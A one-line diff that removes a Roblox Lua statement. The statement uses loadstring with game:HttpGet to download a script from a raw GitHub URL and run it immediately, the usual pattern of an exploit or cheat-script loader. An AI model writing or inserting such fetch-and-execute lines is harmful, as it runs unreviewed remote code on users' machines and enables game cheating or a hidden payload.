@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/StupidProAArsenal/main/main/caca%207441',true))()
